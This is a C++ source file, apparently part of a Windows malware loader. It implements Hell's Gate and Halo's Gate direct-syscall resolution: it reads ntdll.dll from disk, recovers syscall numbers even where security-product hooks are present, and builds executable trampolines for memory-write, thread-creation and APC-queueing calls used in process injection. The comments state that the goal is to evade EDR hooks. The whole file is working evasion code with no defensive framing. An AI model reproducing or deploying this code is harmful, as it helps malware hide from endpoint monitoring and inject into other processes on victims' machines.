// syscalls.cpp — Hell's Gate + Halo's Gate
// Reads ntdll.dll from disk (not the hooked in-memory copy), parses PE exports,
// extracts syscall numbers via stub pattern scan, uses Halo's Gate neighbor search
// for any EDR-hooked stubs, and allocates RX trampoline stubs for each Nt* function.
#include "syscalls.hpp"
#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <algorithm>

SyscallTable g_Syscalls = {};

HMODULE GetNtDllBase() {
    return GetModuleHandleW(L"ntdll.dll");
}

// ============================================================
// Read ntdll.dll from disk — avoids any in-memory EDR hooks
// ============================================================
static bool ReadNtdllFromDisk(std::vector<BYTE>& buf) {
    wchar_t sysDir[MAX_PATH] = {};
    if (!GetSystemDirectoryW(sysDir, MAX_PATH)) return false;

    wchar_t path[MAX_PATH] = {};
    _snwprintf_s(path, MAX_PATH, _TRUNCATE, L"%s\\ntdll.dll", sysDir);

    HANDLE hFile = CreateFileW(path, GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER sz = {};
    if (!GetFileSizeEx(hFile, &sz) || sz.QuadPart < 0x1000 ||
        sz.QuadPart > 64 * 1024 * 1024) {
        CloseHandle(hFile);
        return false;
    }

    buf.resize(static_cast<size_t>(sz.QuadPart));
    DWORD bytesRead = 0;
    BOOL ok = ReadFile(hFile, buf.data(),
                       static_cast<DWORD>(buf.size()), &bytesRead, nullptr);
    CloseHandle(hFile);
    return ok && bytesRead == static_cast<DWORD>(buf.size());
}

// ============================================================
// PE parser — section-aware RVA → file offset
// ============================================================
struct NtdllMap {
    const BYTE*                   data    = nullptr;
    size_t                        size    = 0;
    const IMAGE_NT_HEADERS64*     nt      = nullptr;
    const IMAGE_SECTION_HEADER*   secs    = nullptr;
    WORD                          numSecs = 0;

    bool Init(const std::vector<BYTE>& buf) {
        if (buf.size() < sizeof(IMAGE_DOS_HEADER)) return false;
        data = buf.data();
        size = buf.size();

        auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(data);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

        DWORD ntOff = static_cast<DWORD>(dos->e_lfanew);
        if (ntOff + sizeof(IMAGE_NT_HEADERS64) > size) return false;

        nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(data + ntOff);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
        if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;

        secs    = IMAGE_FIRST_SECTION(nt);
        numSecs = nt->FileHeader.NumberOfSections;
        return true;
    }

    DWORD Rva2Off(DWORD rva) const {
        for (WORD i = 0; i < numSecs; ++i) {
            DWORD vStart = secs[i].VirtualAddress;
            DWORD vEnd   = vStart + std::max(secs[i].SizeOfRawData,
                                             secs[i].Misc.VirtualSize);
            if (rva >= vStart && rva < vEnd) {
                DWORD off = rva - vStart + secs[i].PointerToRawData;
                return (off < static_cast<DWORD>(size)) ? off : 0;
            }
        }
        return 0;
    }

    const BYTE* Ptr(DWORD off, size_t need = 1) const {
        if (!off || off + need > size) return nullptr;
        return data + off;
    }
};

// ============================================================
// Export entry — sorted by RVA for Halo's Gate neighbor walk
// ============================================================
struct ExportSlot {
    std::string name;
    DWORD       rva = 0;
};

static bool BuildExportList(const NtdllMap& m, std::vector<ExportSlot>& out) {
    DWORD expRva = m.nt->OptionalHeader
                     .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                     .VirtualAddress;
    if (!expRva) return false;

    DWORD expOff = m.Rva2Off(expRva);
    if (!expOff || expOff + sizeof(IMAGE_EXPORT_DIRECTORY) > m.size) return false;

    auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(m.Ptr(expOff));
    if (!exp) return false;

    DWORD namesOff = m.Rva2Off(exp->AddressOfNames);
    DWORD ordsOff  = m.Rva2Off(exp->AddressOfNameOrdinals);
    DWORD funcsOff = m.Rva2Off(exp->AddressOfFunctions);
    if (!namesOff || !ordsOff || !funcsOff) return false;

    auto* names = reinterpret_cast<const DWORD*>(m.Ptr(namesOff));
    auto* ords  = reinterpret_cast<const WORD*> (m.Ptr(ordsOff));
    auto* funcs = reinterpret_cast<const DWORD*>(m.Ptr(funcsOff));
    if (!names || !ords || !funcs) return false;

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        DWORD nameOff = m.Rva2Off(names[i]);
        if (!nameOff || nameOff >= m.size) continue;

        const char* nm = reinterpret_cast<const char*>(m.data + nameOff);
        // Accept Nt* but skip NtdllDialogWndProc and similar non-syscall exports
        if (nm[0] != 'N' || nm[1] != 't' ||
            nm[2] == 'd' /* Ntdll... */) continue;

        WORD ord = ords[i];
        if (ord >= exp->NumberOfFunctions) continue;
        DWORD funcRva = funcs[ord];
        if (!funcRva) continue;

        out.push_back({nm, funcRva});
    }

    // Sort by RVA — SSNs are assigned in RVA order; required for Halo's Gate
    std::sort(out.begin(), out.end(),
              [](const ExportSlot& a, const ExportSlot& b) {
                  return a.rva < b.rva;
              });

    return !out.empty();
}

// ============================================================
// Extract SSN from a (possibly partial) syscall stub.
// Pattern: 4C 8B D1 B8 [4-byte SSN] — first occurrence wins.
// Stops at JMP (E9/FF 25) — stub is hooked, returns DWORD(-1).
// ============================================================
static DWORD ExtractSSN(const BYTE* p, size_t maxBytes) {
    for (size_t i = 0; i + 7 < maxBytes; ++i) {
        // Hooked — JMP at entry or inside first 16 bytes → give up
        if (i == 0 && (p[0] == 0xE9 || (p[0] == 0xFF && p[1] == 0x25)))
            return DWORD(-1);
        if (p[i] == 0xE9 || (p[i] == 0xFF && p[i + 1] == 0x25))
            return DWORD(-1);

        if (p[i] == 0x4C && p[i+1] == 0x8B && p[i+2] == 0xD1 &&
            p[i+3] == 0xB8) {
            return *reinterpret_cast<const DWORD*>(p + i + 4);
        }
        if (p[i] == 0xC3) break; // ret — end of stub, not found
    }
    return DWORD(-1);
}

// ============================================================
// Resolve SSN with Halo's Gate: if the target stub is hooked,
// walk neighboring RVA-sorted exports until an unhooked one is
// found, then adjust by ±delta (SSNs are contiguous by RVA).
// ============================================================
static DWORD ResolveSSN(const NtdllMap& m,
                        const std::vector<ExportSlot>& exports,
                        const std::string& name) {
    for (size_t idx = 0; idx < exports.size(); ++idx) {
        if (exports[idx].name != name) continue;

        DWORD off = m.Rva2Off(exports[idx].rva);
        const BYTE* stub = m.Ptr(off, 32);
        if (!stub) return DWORD(-1);

        DWORD ssn = ExtractSSN(stub, 32);
        if (ssn != DWORD(-1)) return ssn;

        // Halo's Gate — scan neighbors
        for (int delta = 1; delta <= 30; ++delta) {
            // Forward neighbor
            if (idx + delta < exports.size()) {
                DWORD nOff = m.Rva2Off(exports[idx + delta].rva);
                const BYTE* ns = m.Ptr(nOff, 32);
                if (ns) {
                    DWORD nSsn = ExtractSSN(ns, 32);
                    if (nSsn != DWORD(-1) && nSsn >= DWORD(delta))
                        return nSsn - DWORD(delta);
                }
            }
            // Backward neighbor
            if (idx >= size_t(delta)) {
                DWORD nOff = m.Rva2Off(exports[idx - delta].rva);
                const BYTE* ns = m.Ptr(nOff, 32);
                if (ns) {
                    DWORD nSsn = ExtractSSN(ns, 32);
                    if (nSsn != DWORD(-1))
                        return nSsn + DWORD(delta);
                }
            }
        }
        return DWORD(-1); // hooked and no clean neighbor found
    }
    return DWORD(-1); // not exported
}

// ============================================================
// Build RX trampoline pool for all required syscalls:
// ============================================================
static PVOID g_TrampolinePool = nullptr;
static size_t g_TrampolineCount = 0;

static PVOID BuildTrampoline(DWORD ssn) {
    constexpr size_t STUB_LEN = 11;
    static const BYTE TEMPLATE[STUB_LEN] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };

    // First call: allocate pool for all 11 syscalls
    if (!g_TrampolinePool) {
        g_TrampolinePool = VirtualAlloc(nullptr, STUB_LEN * 11,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE);
        if (!g_TrampolinePool) return nullptr;
    }

    PVOID stubAddr = reinterpret_cast<BYTE*>(g_TrampolinePool) + (g_TrampolineCount * STUB_LEN);
    
    BYTE stub[STUB_LEN];
    memcpy(stub, TEMPLATE, STUB_LEN);
    *reinterpret_cast<DWORD*>(&stub[4]) = ssn;

    memcpy(stubAddr, stub, STUB_LEN);
    g_TrampolineCount++;

    return stubAddr;
}

static VOID FinalizeTrampolinePool() {
    if (!g_TrampolinePool || g_TrampolineCount == 0) return;
    constexpr size_t STUB_LEN = 11;
    size_t totalBytes = STUB_LEN * g_TrampolineCount;
    DWORD oldProt = 0;
    VirtualProtect(g_TrampolinePool, totalBytes, PAGE_EXECUTE_READ, &oldProt);
    FlushInstructionCache(GetCurrentProcess(), g_TrampolinePool, totalBytes);
}

// ============================================================
// Public entry point
// ============================================================
BOOL InitializeSyscalls() {
    // Free previous pool if retrying — prevents writing past the allocation
    if (g_TrampolinePool) {
        VirtualFree(g_TrampolinePool, 0, MEM_RELEASE);
        g_TrampolinePool  = nullptr;
        g_TrampolineCount = 0;
        g_Syscalls        = {};
    }

    std::vector<BYTE> ntdllBuf;
    if (!ReadNtdllFromDisk(ntdllBuf)) return FALSE;

    NtdllMap m;
    if (!m.Init(ntdllBuf)) return FALSE;

    std::vector<ExportSlot> exports;
    if (!BuildExportList(m, exports)) return FALSE;

#define RESOLVE(sym, field)                                      \
    do {                                                         \
        DWORD _ssn = ResolveSSN(m, exports, sym);               \
        if (_ssn == DWORD(-1)) return FALSE;                     \
        PVOID _t = BuildTrampoline(_ssn);                        \
        if (!_t) return FALSE;                                   \
        g_Syscalls.field =                                       \
            reinterpret_cast<decltype(g_Syscalls.field)>(_t);   \
    } while (0)

    RESOLVE("NtAllocateVirtualMemory",  NtAllocateVirtualMemory);
    RESOLVE("NtWriteVirtualMemory",     NtWriteVirtualMemory);
    RESOLVE("NtProtectVirtualMemory",   NtProtectVirtualMemory);
    RESOLVE("NtCreateThreadEx",         NtCreateThreadEx);
    RESOLVE("NtOpenProcess",            NtOpenProcess);
    RESOLVE("NtClose",                  NtClose);
    RESOLVE("NtQuerySystemInformation", NtQuerySystemInformation);
    RESOLVE("NtMapViewOfSection",       NtMapViewOfSection);
    RESOLVE("NtQueueApcThread",         NtQueueApcThread);
    RESOLVE("NtSuspendThread",          NtSuspendThread);
    RESOLVE("NtResumeThread",           NtResumeThread);

    FinalizeTrampolinePool();

#undef RESOLVE
    return TRUE;
}